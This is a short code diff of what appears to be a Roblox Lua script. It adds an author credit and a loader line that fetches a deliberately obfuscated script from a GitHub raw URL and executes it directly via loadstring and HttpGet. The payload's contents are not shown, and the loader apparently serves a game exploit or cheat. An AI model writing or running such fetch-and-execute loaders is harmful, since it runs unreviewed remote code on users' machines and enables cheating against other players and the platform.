@@ -1,1 +1,3 @@
-loadstring(game:HttpGet("Hehe"))()
+-- Made By @Hakari
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/StrongerRiz/Riz-Private/refs/heads/main/Andro-Obfuscated"))()
